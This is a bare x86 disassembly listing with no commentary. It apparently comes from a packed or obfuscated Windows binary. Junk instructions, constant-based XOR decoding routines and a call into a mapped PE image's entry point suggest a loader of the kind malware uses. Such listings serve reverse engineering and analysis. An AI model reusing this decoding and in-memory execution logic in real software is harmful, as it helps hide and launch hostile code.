  40d716:	cmp    BYTE PTR [eax-0x35],0x82
  40d71a:	add    BYTE PTR [ebx+0x55728f24],dl
  40d720:	lds    esp,FWORD PTR [ecx]
  40d722:	lea    ebx,[esi+0x9ebdecb]
  40d728:	mov    edx,DWORD PTR [bp+si-0x726d]
  40d72d:	mov    ecx,0x91a3fd09
  40d732:	(bad)  
  40d733:	mov    bh,0xd9
  40d735:	fnstenv [ecx]
  40d737:	arpl   WORD PTR [edi+0x32],di
  40d73a:	pusha  
  40d73b:	frstor [eax]
  40d73d:	sahf   
  40d73e:	rcr    DWORD PTR [ebp+0x2c],cl
  40d741:	pop    esi
  40d742:	test   bl,bl
  40d744:	cmp    cl,BYTE PTR [edx+0x28]
  40d747:	sar    edi,1
  40d749:	sub    dl,BYTE PTR [ebp+0x48]
  40d74c:	adc    edx,0xffffff90
  40d74f:	fmulp  st(7),st
  40d751:	mov    edi,0xb58ba50e
  40d756:	subps  xmm0,XMMWORD PTR [ebx]
  40d759:	popf   
  40d75a:	cli    
  40d75b:	gs aam 0xfd
  40d75e:	xchg   esp,eax
  40d75f:	loopne 0x40d784
  40d761:	daa    
  40d762:	jne    0x40d757
  40d764:	pop    esp
  40d765:	add    bl,BYTE PTR [esi+0x18]
  40d768:	sub    eax,DWORD PTR [ebp+0x2c]
  40d76b:	cmp    eax,0xf0341151
  40d770:	and    esi,DWORD PTR [edi]
  40d772:	xor    eax,0xe304827
  40d777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d778:	sbb    esi,DWORD PTR [ecx]
  40d77a:	and    eax,0x6eba48bd
  40d77f:	mov    WORD PTR [ecx+ebx*4+0x10],ss
  40d783:	and    eax,DWORD PTR [edi]
  40d785:	mov    ds:0x8d3d2baf,eax
  40d78a:	call   0x9f7e0160
  40d78f:	push   eax
  40d790:	rol    DWORD PTR [ebx+ecx*4+0x4f7f61c0],0xab
  40d798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d799:	int    0xc6
  40d79b:	or     BYTE PTR [eax],0xb6
  40d79e:	or     eax,ebp
  40d7a0:	popf   
  40d7a1:	xor    ebx,DWORD PTR [esp+eax*8]
  40d7a4:	push   edi
  40d7a5:	pop    ebp
  40d7a6:	addr16 adc dh,bl
  40d7a9:	jne    0x40d768
  40d7ab:	adc    eax,0x6a4c12d4
  40d7b0:	(bad)  
  40d7b2:	mov    ebx,DWORD PTR [edx-0x19]
  40d7b5:	aaa    
  40d7b6:	mov    fs,ebp
  40d7b8:	mov    ebx,0x2f34871b
  40d7bd:	fdivr  st,st(5)
  40d7bf:	mul    BYTE PTR [eax+ebp*2]
  40d7c2:	push   edi
  40d7c3:	bound  esi,QWORD PTR [edx+0x56]
  40d7c6:	sub    DWORD PTR [esi-0x47],edi
  40d7c9:	dec    ebx
  40d7ca:	inc    ebx
  40d7cb:	mov    eax,ds:0x80fdf54f
  40d7d0:	stos   BYTE PTR es:[edi],al
  40d7d1:	cmp    BYTE PTR [ecx+0x6bf8c2d8],0x9b
  40d7d8:	pop    ebx
  40d7d9:	push   cs
  40d7da:	outs   dx,DWORD PTR ds:[esi]
  40d7db:	cmc    
  40d7dc:	outs   dx,BYTE PTR ds:[esi]
  40d7dd:	add    cl,bh
  40d7df:	jge    0x40d7e5
  40d7e1:	and    al,0x8f
  40d7e3:	xor    dl,BYTE PTR [eax+0x20]
  40d7e6:	out    0x96,al
  40d7e8:	inc    esp
  40d7e9:	jnp    0x40d80e
  40d7eb:	inc    esi
  40d7ec:	call   0x2842:0xbb008762
  40d7f3:	push   es
  40d7f4:	mov    esp,0xe1b5fa06
  40d7f9:	sub    eax,0x841aaa75
  40d7fe:	mov    dh,BYTE PTR [esi]
  40d800:	out    0x44,al
  40d802:	xchg   DWORD PTR [esi-0x28c94429],ecx
  40d808:	sub    edi,DWORD PTR [esi]
  40d80a:	push   ds
  40d80b:	stos   BYTE PTR es:[edi],al
  40d80c:	mov    ds:0xdaa4fb89,eax
  40d811:	lock xchg esp,eax
  40d813:	adc    al,0xa8
  40d815:	fs sahf 
  40d817:	outs   dx,DWORD PTR ds:[esi]
  40d818:	jmp    0x82e2d36d
  40d81d:	in     eax,0x37
  40d81f:	cwde   
  40d820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d821:	call   0xffff5f8f
  40d826:	xor    eax,0x6d6d1ff5
  40d82b:	xor    DWORD PTR [esi+0x4cc74b1a],ebp
  40d831:	or     esp,DWORD PTR [esi-0x75]
  40d834:	out    0x21,eax
  40d836:	loopne 0x40d89e
  40d838:	ret    
  40d839:	enter  0x4e8e,0xfd
  40d83d:	out    dx,al
  40d83e:	mov    bl,0xd
  40d840:	adc    al,0x11
  40d842:	loope  0x40d7cc
  40d844:	and    BYTE PTR [ecx+0x7a58e0f4],0x71
  40d84b:	mov    ch,0xfa
  40d84d:	test   BYTE PTR [edx],dh
  40d84f:	das    
  40d850:	rcr    BYTE PTR [eax-0x9],0xca
  40d854:	add    al,BYTE PTR [ebx+0x27147502]
  40d85a:	sub    al,0x44
  40d85c:	arpl   WORD PTR [edi+0x1a],ax
  40d85f:	pushf  
  40d860:	pop    ecx
  40d861:	push   edi
  40d862:	dec    eax
  40d863:	add    esp,DWORD PTR [edi-0x42]
  40d866:	test   DWORD PTR [esi+0x1c79b356],esp
  40d86c:	repnz pop ss
  40d86e:	rcl    BYTE PTR [edi],cl
  40d870:	push   eax
  40d871:	mov    ebp,0x8bf07d03
  40d876:	push   ebp
  40d877:	loopne 0x40d804
  40d879:	pop    ebp
  40d87a:	clc    
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x1d2c2fbc]
  40e122:	test   al,0x8a
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e140
  40e12d:	mov    edi,DWORD PTR [edx+0x4359f00f]
  40e133:	repz in al,dx
  40e135:	jmp    0x40e0be
  40e137:	(bad)  
  40e138:	xor    ah,BYTE PTR [eax]
  40e13a:	or     eax,0x7b0e04a3
  40e13f:	push   cs
  40e140:	pop    ebp
  40e141:	inc    ebp
  40e142:	sbb    DWORD PTR [eax-0x39f01576],ebp
  40e148:	push   esp
  40e149:	cmp    DWORD PTR [esi],esp
  40e14b:	pop    ds
  40e14c:	sub    al,0x78
  40e14e:	jno    0x40e0dc
  40e150:	pop    ebp
  40e151:	jo     0x40e179
  40e153:	js     0x40e106
  40e155:	outs   dx,DWORD PTR ds:[esi]
  40e156:	enter  0xb696,0x69
  40e15a:	div    DWORD PTR [edi]
  40e15c:	and    ah,BYTE PTR [ebp-0x16a85c16]
  40e162:	ja     0x40e1b2
  40e164:	dec    edi
  40e165:	call   0xc578:0x94e52d21
  40e16c:	loop   0x40e17e
  40e16e:	clc    
  40e16f:	xor    al,0xd9
  40e171:	pop    eax
  40e172:	call   0xc470:0xe08de97e
